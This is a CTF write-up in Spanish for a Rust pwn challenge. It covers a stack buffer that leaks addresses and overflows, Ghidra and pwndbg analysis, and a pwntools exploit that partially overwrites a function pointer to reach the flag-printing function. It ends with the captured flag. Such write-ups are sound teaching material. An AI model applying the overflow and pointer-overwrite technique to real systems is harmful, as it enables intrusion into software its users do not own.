# teenage-rof

```
 checksec teenage-rof
[*] '/home/kalcast/Descargas/ctf/PWN/teenager-rof/teenage-rof'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

##
Con `strings teenage-rof|grep rust` podemos observar que fu escrito en Rust, lenguaje que se caracteriza sobre todo por hacer hincapié en la seguridad.

```
$ ./teenage-rof
1 write
2 show
3 run
4 exit
2
len:
1000
0000000000000000000000000000000000000000000000000000000000000000310a1beec0550000310a1beec0550000650a1beec055000008689e97fd7f0000001000000000000018689e97fd7f000000901e97fd7f000008669e97fd7f000001000000000000004c091beec055000068a01feec0550000f41f1beec0550000c0669e97fd7f0000b3f804520000000000901e97fd7f00000000000000000000d09a1eeec0550000000000000000000000689e97fd7f0000000000000000000010e9d20ac1550000f00000000000000000809c97fd7f000000909e97fd7f00000000800000000000ffffffffffffffff00f00252437f000000000000000000000020000000000000001000000000000018689e97fd7f000000b8fb7def52f6ce00901e97fd7f00000400000800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008689e97fd7f0000000000000000000000f00652437f000060791feec0550000a8bce151437f0000f0679e97fd7f0000d01b1beec055000040a01aee0100000008689e97fd7f000008689e97fd7f0000bd8c57901fde6b23000000000000000018689e97fd7f000000f00652437f000060791feec0550000bd8c555e23f190dcbd8c95e8dc7deddd00000000000000000000000000000000000000000000000008689e97fd7f0000010000000000000000b8fb7def52f6ce010000000000000065bde151437f0000d01b1beec055000060791feec055000010030752437f00000000000000000000000000000000000050081beec055000000689e97fd7f00000000000000000000000000000000000075081beec0550000f8679e97fd7f000038000000000000000100000000000000dc819e97fd7f00000000000000000000ea819e97fd7f000011829e97fd7f000049829e97fd7f000066829e97fd7f00007a829e97fd7f0000b0829e97fd7f0000c6829e97fd7f0000d1829e97fd7f0000e2829e97fd7f000016839e97fd7f000032839e97fd7f000045839e97fd7f000050839e97fd7f000062839e97fd7f00007a839e97fd7f000092839e97fd7f0000a7839e97fd7f0000bc839e97fd7f0000d5839e97fd7f0000ea839e97fd7f000002849e97fd7f000012849e97fd7f0000358b9e97fd7f00005c8b9e97fd7f0000758c9e97fd7f0000a68c9e97fd7f0000b98c9e97fd7f0000c88c9e97fd7f0000d08c9e97fd7f0000e38c9e97fd7f0000128d9e97fd7f0000278d9e97fd7f0000398d9e97fd7f0000538d9e97fd7f0000778d9e97fd7f0000858d9e97fd7f0000928d9e97fd7f0000a48d9e97fd7f0000c98d9e97fd7f0000fc8d9e97fd7f0000
1 write
2 show
3 run
4 exit
1
n bytes:
200
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ok
1 write
2 show
3 run
4 exit
4
zsh: segmentation fault  ./teenage-ro
```

Concluimos que hay lectura arbitraria a partir del buffer de datos y se puede provocar un segmentation fault.

##
Depurandolo con `pwndbg` se sabe que el buffer esta en la pila y que por lo tanto el segmentation fault es causado por un buffer overflow.

```
pwndbg> r
Starting program: /home/kalcast/Descargas/ctf/PWN/teenager-rof/teenage-rof
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
1 write
2 show
3 run
4 exit
1
n bytes:
200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
ok
1 write
2 show
3 run
4 exit
?
1 write
2 show
3 run
4 exit
4
```

<img width="895" height="562" alt="2025-09-16-143143_895x562_scrot" src="https://github.com/user-attachments/assets/c214f9df-7852-4657-89c0-a612e6da25b4" />

Como el buffer está en la pila, y podemos leer contenido en direcciones de memoria mayores que este, tendremos acceso de seguro a alguna que otra direccion para filtrar.

Para analizar estaticamente el binario use `ghidra` y estuve un rato hasta que encontré la funcion con la logica principal del programa. 

Con la informacion de ghidra extraje el offset desde base del segmento `.text` hasta la direccion que llama a la funcion para elegir un numero de opcion:

<img width="1361" height="531" alt="2025-09-16-143907_1361x531_scrot" src="https://github.com/user-attachments/assets/2b147ab9-aeb1-4b59-b0db-48bc29bb5677" />

<img width="1365" height="90" alt="2025-09-16-143934_1365x90_scrot" src="https://github.com/user-attachments/assets/8baa85a3-9987-4897-90cb-6ea757904dd4" />

```
>>> hex(0x0010785d - 0x00105040)
'0x281d'
```
<p>Nota: Muchos nombres de funciones y variables fueron renombradas.</p>

Necesitamos este offset para poner breakpoints porque el binario no tiene simbolos (stripped):
```
 file teenage-rof
teenage-rof: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d077f2ce7e159e4de032da207f336fb48d568b9d, for GNU/Linux 4.4.0, stripped
```

##
El proceso se veria asi en `pwndbg`/`gdb`:
1. `start` para cargar el programa y detenerlo en el entryPoint
2. `info proc mappings`para ver la direccion base del segmento ejecutable del binario (.text)
3. `p/dx addr1 + addr2` para obtener la nueva direccion
4. `pd addr` para confirmar que es la correcta
5. `break *addr` para agregar el breakpoint

<img width="1315" height="548" alt="2025-09-16-144520_1315x548_scrot" src="https://github.com/user-attachments/assets/25536cfe-46a6-4a18-933d-1e0a0503515c" />

```
pwndbg> p/dx 0x0000555555559000 + 0x281d
$7 = 0x55555555b81d
```

<img width="1321" height="504" alt="2025-09-16-150022_1321x504_scrot" src="https://github.com/user-attachments/assets/3f6c71a5-e7ac-46aa-98ea-fdf700eea4cc" />

Hay un pequeño error aqui, la direccion que encontramos esta 0x40 bytes por detras de la que estamos buscando:
```
>>> hex(0x55555555b8ad -  0x55555555b86d)
'0x40'
```

Esto puede deberse a que `ghidra` al estar trabajando con el espacio estatico no toma en cuenta algun prologo o alineacion de memoria.

Dejando eso de lado, el breakpoint entonces estaria en ` 0x55555555b85d` (esto es antes de aceptar la entrada de usuario, uno mejor puede ser justo 5 bytes despues: `0x000055555555b862`.

En la pila:

<img width="1117" height="511" alt="2025-09-16-152101_1117x511_scrot" src="https://github.com/user-attachments/assets/d9889788-ad76-4b96-b907-602ac4e4d4a6" />

`[rsp + 0xc0]` y `[rsp + 0xc8]` contienen la direccion de la funcion que ejecuta la opcion "run". La cual analice con ghidra y es solo un wrapper de la funcion que se usa para imprimir que le pasa un puntero a la cadena "try_harder":

<img width="1364" height="561" alt="2025-09-16-152333_1364x561_scrot" src="https://github.com/user-attachments/assets/4a1dafdb-82af-4498-8768-8851bc1da341" />

`[rsp + 0xd0]` es la funcion "win" de este reto, puesto que abre la flag e imprime su contenido:

<img width="1351" height="609" alt="2025-09-16-152528_1351x609_scrot" src="https://github.com/user-attachments/assets/cc785da6-1865-4dc4-8945-806d992fd615" />

Se puede ver en la funcion que contiene la logica principal del programa el momento en que se asignan estas funciones a las variables locales:

<img width="1129" height="122" alt="2025-09-16-152654_1129x122_scrot" src="https://github.com/user-attachments/assets/987de325-36de-4161-9826-5bf4f169e552" />

Y como se llama explicitamente a la direccion que contiene el puntero de `[rsp + 0xc8]` (local 48):

<img width="1079" height="133" alt="2025-09-16-152726_1079x133_scrot" src="https://github.com/user-attachments/assets/b4c2fd71-396d-4c66-aa1a-5b1a714f27c0" />

##
Originalmente mi solucion fue:
1. Filtrar la direccion de `open_flag_function` con "show"
2. Sobreescribir la direccion de `try_harder_function` (`[rsp + 0xc8]`) por la de `open_flag_function` con "write"
3. Invocar a la funcion con "run" 
 
Pero alguien lo hizo de una forma mas inteligente al simplemente sobreescribir parcialmente el byte menos significativo en `[rsp + 0xc8]` por '0x65'. 

### Exploit
```py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./teenage-rof")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
break main
'''

domain= "ctf.ac.upt.ro"
port = 9851

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
# partial overwrite
time.sleep(0.5)
r.sendline(b"1\n33\n" + b"A"*32 + b"\x65\n3\n4")
r.interactive()
print(r.recvuntil(b"exit\n"))
```

`CTF{ed30505bbe7a651829d9d747f7af11677c7c3ff8f4e871a5269920c961765747}`







